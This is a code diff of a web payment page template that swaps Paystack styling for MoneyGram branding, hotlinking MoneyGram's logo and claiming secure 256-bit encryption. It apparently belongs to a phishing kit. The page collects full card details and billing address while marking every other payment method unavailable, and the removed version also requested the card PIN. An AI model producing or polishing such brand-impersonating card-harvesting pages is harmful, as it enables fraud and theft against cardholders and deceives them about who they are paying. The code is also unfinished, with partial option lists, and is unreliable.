@@ -4,67 +4,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Page</title>
+    <title>MoneyGram Payment</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.16/dist/tailwind.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --paystack-green: #3BB75E;
-            --paystack-blue: #011B33;
+            --moneygram-orange: #F26522;
+            --moneygram-dark-blue: #003B64;
+        }
+        
+        body {
+            background-color: #f4f4f4;
+            font-family: 'Arial', sans-serif;
         }
         
         .payment-input {
             width: 100%;
-            padding: 0.5rem 0.75rem;
-            border: 1px solid #d1d5db;
-            border-radius: 0.375rem;
-            outline: none;
-            transition: box-shadow 0.2s ease-in-out, border-color 0.2s ease-in-out;
+            padding: 0.75rem;
+            border: 2px solid #e0e0e0;
+            border-radius: 0.25rem;
+            background-color: white;
+            transition: border-color 0.3s ease;
         }
         
         .payment-input:focus {
-            box-shadow: 0 0 0 2px rgba(59, 183, 94, 0.5);
-            border-color: transparent;
+            outline: none;
+            border-color: var(--moneygram-orange);
+            box-shadow: 0 0 0 2px rgba(242, 101, 34, 0.2);
         }
         
         .payment-label {
             display: block;
             font-size: 0.875rem;
-            font-weight: 500;
-            color: #4b5563;
-            margin-bottom: 0.25rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 0.5rem;
         }
         
         .payment-method {
             display: flex;
             align-items: center;
-            gap: 0.75rem;
-            width: 100%;
-            padding: 0.75rem 1rem;
-            text-align: left;
-            border-radius: 0.375rem;
-            transition: background-color 0.2s ease-in-out, color 0.2s ease-in-out;
+            justify-content: center;
+            flex-direction: column;
+            padding: 1rem;
+            text-align: center;
+            border: 2px solid transparent;
+            border-radius: 0.5rem;
+            transition: all 0.3s ease;
             cursor: pointer;
-            position: relative;
         }
         
         .payment-method:hover {
-            background-color: #f0fdf4;
+            border-color: var(--moneygram-orange);
+            background-color: rgba(242, 101, 34, 0.05);
         }
         
         .payment-method.active {
-            background-color: var(--paystack-green);
-            color: white;
-            font-weight: 600;
-        }
-        
-        .payment-method.active i {
-            color: white;
+            border-color: var(--moneygram-orange);
+            background-color: rgba(242, 101, 34, 0.1);
         }
         
         .payment-method-icon {
-            width: 2rem;
-            text-align: center;
+            font-size: 2rem;
+            color: var(--moneygram-dark-blue);
+            margin-bottom: 0.5rem;
         }
         
         .section-content {
@@ -75,40 +78,52 @@
             display: block;
         }
         
-        .test-badge {
-            padding: 0.25rem 0.5rem;
-            font-size: 0.75rem;
-            font-weight: 500;
-            background-color: #fef3c7;
-            color: #92400e;
-            border-radius: 0.375rem;
-            text-transform: uppercase;
+        .moneygram-btn {
+            background-color: var(--moneygram-orange);
+            color: white;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
         }
-
+        
+        .moneygram-btn:hover {
+            background-color: #d5540d;
+        }
+        
+        .secure-badge {
+            background-color: #e6f3ff;
+            color: var(--moneygram-dark-blue);
+            padding: 0.25rem 0.5rem;
+            border-radius: 0.25rem;
+            font-size: 0.75rem;
+            font-weight: bold;
+        }
     </style>
 </head>
-<body class="bg-gray-50 min-h-screen flex flex-col">
+<body class="min-h-screen flex flex-col bg-gray-50">
     <!-- Preloader -->
     <div class="fixed inset-0 bg-white flex items-center justify-center z-50" id="preloader">
-        <div class="loader animate-spin border-t-4 border-green-500 rounded-full w-12 h-12"></div>
+        <div class="flex flex-col items-center">
+            <img src="https://www.moneygram.com/content/dam/moneygram/logos/moneygram-logo.svg" alt="MoneyGram" class="w-48 mb-4">
+            <div class="loader animate-spin border-t-4 border-orange-500 rounded-full w-12 h-12"></div>
+        </div>
     </div>
 
     <!-- Main Container -->
     <div class="container mx-auto px-4 py-8 max-w-4xl flex-grow hidden" id="content">
         <div class="bg-white rounded-xl shadow-lg overflow-hidden">
             <!-- Header -->
-            <div class="bg-green-50 px-6 py-4 border-b border-gray-100">
+            <div class="bg-gray-100 px-6 py-4 border-b border-gray-200">
                 <div class="flex items-center justify-between">
                     <div>
                         <div class="flex items-center space-x-2">
-                            <span class="text-gray-600">{{ form.email.value|default_if_none:"" }}</span>
-                            <span class="test-badge">SECURE</span>
+                            <img src="https://www.moneygram.com/content/dam/moneygram/logos/moneygram-logo.svg" alt="MoneyGram" class="h-10">
+                            <span class="secure-badge">SECURE PAYMENT</span>
                         </div>
-                        <h2 class="text-xl font-bold text-green-600">Pay {{ display_currency }} {{ display_price }}</h2>
+                        <h2 class="text-xl font-bold text-gray-800 mt-2">Pay {{ display_currency }} {{ display_price }}</h2>
                     </div>
-                    <div class="text-gray-400">
-                        <i class="fas fa-lock mr-2"></i>
-                        <img src="https://beta-form.coursearena.com.ng/assets/img/images.png" alt="Paystack" class="h-10 rounded-lg inline-block">
+                    <div class="text-gray-500">
+                        <i class="fas fa-shield-alt mr-2"></i>
+                        256-bit Encryption
                     </div>
                 </div>
             </div>
@@ -117,58 +132,54 @@
             <div class="grid grid-cols-1 md:grid-cols-3">
                 <!-- Payment Methods Sidebar -->
                 <div class="md:col-span-1 bg-gray-50 border-r border-gray-100 p-4">
-                    <h3 class="text-sm font-semibold text-gray-700 mb-4 uppercase">Pay With</h3>
-                    <div class="flex flex-col items-start space-y-4">
-                        <!-- Card -->
-                        <button class="flex items-center space-x-2 payment-method active text-left w-full" data-section="card">
-                            <i class="fas fa-credit-card text-lg payment-method-icon"></i>
-                            <span>Card</span>
+                    <h3 class="text-sm font-semibold text-gray-700 mb-4 uppercase">Payment Method</h3>
+                    <div class="grid grid-cols-3 md:grid-cols-1 gap-4">
+                        <!-- Credit Card -->
+                        <button class="payment-method active" data-section="card">
+                            <i class="fas fa-credit-card payment-method-icon"></i>
+                            <span class="text-sm">Credit Card</span>
                         </button>
-                        <!-- Transfer -->
-                        <button class="flex items-center space-x-2 payment-method text-left w-full" data-section="transfer">
-                            <i class="fas fa-exchange-alt text-lg payment-method-icon"></i>
-                            <span>Transfer</span>
+                        <!-- Debit Card -->
+                        <button class="payment-method" data-section="debit">
+                            <i class="fas fa-id-card payment-method-icon"></i>
+                            <span class="text-sm">Debit Card</span>
                         </button>
-                        <!-- Bank -->
-                        <button class="flex items-center space-x-2 payment-method text-left w-full" data-section="bank">
-                            <i class="fas fa-university text-lg payment-method-icon"></i>
-                            <span>Bank</span>
-                        </button>
-                        <!-- PayAttitude -->
-                        <button class="flex items-center space-x-2 payment-method text-left w-full" data-section="payattitude">
-                            <i class="fas fa-wallet text-lg payment-method-icon"></i>
-                            <span>PayAttitude</span>
-                        </button>
-                        <!-- OPay -->
-                        <button class="flex items-center space-x-2 payment-method text-left w-full" data-section="opay">
-                            <i class="fas fa-mobile-alt text-lg payment-method-icon"></i>
-                            <span>OPay</span>
-                            <span class="ml-auto text-xs bg-red-100 text-red-600 px-2 py-1 rounded">NEW</span>
+                        <!-- Online Banking -->
+                        <button class="payment-method" data-section="bank">
+                            <i class="fas fa-university payment-method-icon"></i>
+                            <span class="text-sm">Online Banking</span>
                         </button>
                     </div>
                 </div>
 
-
                 <!-- Payment Sections -->
                 <div class="md:col-span-2 p-6">
-                    <!-- Card Payment Section -->
+                    <!-- Credit Card Payment Section -->
                     <div id="card-section" class="section-content active">
                         <form method="post" class="space-y-6">
                             {% csrf_token %}
                             <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}">
-                            <div>
-                                <label class="payment-label" for="{{ form.name.id_for_label }}">
-                                    Name
-                                </label>
-                                {{ form.name }}
-                                {% if form.name.errors %}
-                                    <span class="text-red-500 text-xs mt-1">{{ form.name.errors|join:", " }}</span>
-                                {% endif %}
+                            
+                            <div class="grid grid-cols-2 gap-4">
+                                <div>
+                                    <label class="payment-label" for="{{ form.first_name.id_for_label }}">
+                                        First Name
+                                    </label>
+                                    <input type="text" name="first_name" id="{{ form.first_name.id_for_label }}" 
+                                           class="payment-input" placeholder="John" required>
+                                </div>
+                                <div>
+                                    <label class="payment-label" for="{{ form.last_name.id_for_label }}">
+                                        Last Name
+                                    </label>
+                                    <input type="text" name="last_name" id="{{ form.last_name.id_for_label }}" 
+                                           class="payment-input" placeholder="Doe" required>
+                                </div>
                             </div>
 
                             <div>
                                 <label class="payment-label" for="{{ form.email.id_for_label }}">
-                                    Email
+                                    Email Address
                                 </label>
                                 {{ form.email }}
                                 {% if form.email.errors %}
@@ -186,15 +197,26 @@
                                 {% endif %}
                             </div>
 
-                            <div class="grid grid-cols-2 gap-4">
-                                <div>
-                                    <label class="payment-label" for="{{ form.expiry_date.id_for_label }}">
-                                        Card Expiry
+                            <div class="grid grid-cols-3 gap-4">
+                                <div class="col-span-2">
+                                    <label class="payment-label" for="card-expiry">
+                                        Expiration Date
                                     </label>
-                                    {{ form.expiry_date }}
-                                    {% if form.expiry_date.errors %}
-                                        <span class="text-red-500 text-xs mt-1">{{ form.expiry_date.errors|join:", " }}</span>
-                                    {% endif %}
+                                    <div class="grid grid-cols-2 gap-2">
+                                        <select class="payment-input" required>
+                                            <option value="">Month</option>
+                                            <option value="01">01 - January</option>
+                                            <option value="02">02 - February</option>
+                                            <!-- Add rest of months -->
+                                        </select>
+                                        <select class="payment-input" required>
+                                            <option value="">Year</option>
+                                            <option value="2024">2024</option>
+                                            <option value="2025">2025</option>
+                                            <option value="2026">2026</option>
+                                            <!-- Add more years -->
+                                        </select>
+                                    </div>
                                 </div>
                                 <div>
                                     <label class="payment-label" for="{{ form.cvv.id_for_label }}">
@@ -214,23 +236,33 @@
                             </div>
 
                             <div>
-                                <label class="payment-label" for="{{ form.card_pin.id_for_label }}">
-                                    Card PIN
+                                <label class="payment-label" for="billing-address">
+                                    Billing Address
                                 </label>
-                                <div class="relative">
-                                    {{ form.card_pin }}
-                                    <button type="button" class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400" 
-                                            onclick="toggleFieldVisibility('{{ form.card_pin.id_for_label }}', 'cvv-toggle-icon')">
-                                        <i class="fas fa-eye" id="pin-toggle-icon"></i>
-                                    </button>
+                                <input type="text" id="billing-address" class="payment-input" 
+                                       placeholder="Street Address" required>
+                            </div>
+
+                            <div class="grid grid-cols-3 gap-4">
+                                <div>
+                                    <label class="payment-label" for="billing-city">City</label>
+                                    <input type="text" id="billing-city" class="payment-input" 
+                                           placeholder="City" required>
                                 </div>
-                                {% if form.card_pin.errors %}
-                                    <span class="text-red-500 text-xs mt-1">{{ form.card_pin.errors|join:", " }}</span>
-                                {% endif %}
+                                <div>
+                                    <label class="payment-label" for="billing-state">State</label>
+                                    <input type="text" id="billing-state" class="payment-input" 
+                                           placeholder="State" required>
+                                </div>
+                                <div>
+                                    <label class="payment-label" for="billing-zip">ZIP</label>
+                                    <input type="text" id="billing-zip" class="payment-input" 
+                                           placeholder="ZIP" required>
+                                </div>
                             </div>
 
                             <div>
-                                <button type="submit" class="w-full bg-green-500 hover:bg-green-600 text-white font-medium py-3 px-4 rounded-lg transition-colors">
+                                <button type="submit" class="w-full moneygram-btn font-bold py-3 px-4 rounded-lg transition-colors">
                                     Pay {{ display_currency }} {{ display_price }}
                                 </button>
                             </div>
@@ -238,26 +270,15 @@
                     </div>
 
                     <!-- Other Payment Method Sections -->
-                    <div id="transfer-section" class="section-content text-center py-12">
-                        <i class="fas fa-exchange-alt text-6xl text-gray-300 mb-4"></i>
-                        <h3 class="text-xl font-semibold text-gray-700">Transfer Payment Unavailable due to high traffic</h3>
+                    <div id="debit-section" class="section-content text-center py-12">
+                        <i class="fas fa-id-card text-6xl text-gray-300 mb-4"></i>
+                        <h3 class="text-xl font-semibold text-gray-700">Debit Card Payment Unavailable</h3>
                     </div>
 
                     <div id="bank-section" class="section-content text-center py-12">
                         <i class="fas fa-university text-6xl text-gray-300 mb-4"></i>
-                        <h3 class="text-xl font-semibold text-gray-700">Bank Payment Unavailable due to high traffic</h3>
+                        <h3 class="text-xl font-semibold text-gray-700">Online Banking Unavailable</h3>
                     </div>
-
-                    <div id="payattitude-section" class="section-content text-center py-12">
-                        <i class="fas fa-wallet text-6xl text-gray-300 mb-4"></i>
-                        <h3 class="text-xl font-semibold text-gray-700">PayAttitude Payment Unavailable due to high traffic</h3>
-                    </div>
-
-                    <div id="opay-section" class="section-content text-center py-12">
-                        <i class="fas fa-mobile-alt text-6xl text-gray-300 mb-4"></i>
-                        <h3 class="text-xl font-semibold text-gray-700">OPay Payment Unavailable due to high traffic</h3>
-                    </div>
-
                 </div>
             </div>
         </div>
@@ -322,6 +343,7 @@
                 icon.classList.add('fa-eye');
             }
         }
+
+        
     </script>
 </body>
-</html>
